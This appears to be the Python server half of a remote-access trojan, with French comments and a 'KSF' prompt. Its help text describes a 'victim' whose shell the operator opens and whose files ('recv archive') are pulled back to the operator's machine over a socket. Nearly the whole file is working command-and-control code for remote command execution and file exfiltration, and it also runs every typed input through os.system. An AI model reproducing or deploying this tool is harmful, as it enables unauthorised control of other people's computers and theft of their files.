import socket
import os
from time import sleep
SIZE = 1024
FORMAT = "utf"
SERVER_FOLDER = "server_folder"

"""----------------------------------------------création du socket coté serveur--------------------------------------"""

#Gestion des sockets pour la connexion réseau
IP = socket.gethostbyname("localhost")
PORT = 8004

socket_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

socket_serveur.bind((IP, PORT))
socket_serveur.listen(10)

conn, cliente = socket_serveur.accept()

#recevoir un message de la part du client
welcome = conn.recv(1024)
#afficher le message
print(welcome.decode("utf-8"))



"""---------------------------------------classe Shell--------------------------------------------------------------------"""

class Shell:
    def __init__(self, SHELL_BT):
        self.SHELL_BT = SHELL_BT
    """---------------------fonction verif----------------------"""
   
    def verifications(SHELL_BT):
        verifications = ["shell", "exit", "recvarchive", "help"]
        if(SHELL_BT == verifications[0]):
            while True:
                shell = Shell.command()
                if shell == "exit":
                    break
        if(SHELL_BT == verifications[1]):
            conn.send("exit".encode())
            conn.close()
            socket_serveur.close()
            exit()
        if(verifications[2] in SHELL_BT):
            conn.send("filesend".encode())
            Shell.recv_archive(SHELL_BT)
        if(not SHELL_BT in verifications):
            if(verifications[2] in SHELL_BT):
                return(" ")
        os.system(SHELL_BT)
        print("\n")
        if(SHELL_BT == verifications[3]):
            print("\033[1;32mversion 0.1\n\nCommands:\n\nhelp			Print this message helper\nshell			Opens the victim shell\nrecv archive		Chose an archive of victim and recv to your computer\nexit		Exit the program\n\n\nUsage Method:\n\nrecv archive		recv archive <filename_client> <filename_server>\n\n\n\033[0;0m")

    """-------------------------fonction Home-----------------"""
    
    def home():
        conn.send("home".encode())
        HOME = conn.recv(1024).decode("utf-8")
        return(HOME)
    
    """---------------------fonction command---------------------"""

    def command():
            
        HOME = Shell.home()
        SHELL = str(input("%s>> "%(HOME)))
        if(SHELL == "exit"):
            SHELL = ""
            return("exit")
        conn.send("command".encode())
        sleep(1)
        conn.send(SHELL.encode())
        print(conn.recv(1024).decode("utf-8"))

    """-----------------------Fonction recevoir------------------------"""
    
    def recv_archive(filenames) :
       while True:
            print(f"[NEW CONNECTION] {cliente} connected.\n")

            """ Receiving the folder_name """
            folder_name = conn.recv(SIZE).decode(FORMAT)

            """ Creating the folder """
            folder_path = os.path.join(SERVER_FOLDER, folder_name)
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)
                conn.send(f"Folder ({folder_name}) created.".encode(FORMAT))
            else:
                conn.send(f"Folder ({folder_name}) already exists.".encode(FORMAT))

            """ Receiving files """
            while True:
                msg = conn.recv(SIZE).decode(FORMAT)
                cmd, data = msg.split(":")

                if cmd == "FILENAME":
                    """ Recv the file name """
                    print(f"[CLIENT] Received the filename: {data}.")

                    file_path = os.path.join(folder_path, data)
                    file = open(file_path, "w")
                    conn.send("Filename received.".encode(FORMAT))

                elif cmd == "DATA":
                    """ Recv data from client """
                    print(f"[CLIENT] Receiving the file data.")
                    file.write(data)
                    conn.send("File data received".encode(FORMAT))

                elif cmd == "FINISH":
                    file.close()
                    print(f"[CLIENT] {data}.\n")
                    conn.send("The data is saved.".encode(FORMAT))

                elif cmd == "CLOSE":
                    conn.close()
                    print(f"[CLIENT] {data}")
                    break


    """----------------------------------------------------------""" 

"""------------------------------------------------------------------END Class--------------------------------------------------------------------------"""


while True:
    try:
        shell_btnt = str(input("\033[31m\033[1mKSF\033[31m>>\033[1;32m "))
        Shell.verifications(shell_btnt)
    except KeyboardInterrupt:
        conn.close()
        socket_serveur.close()
        exit()
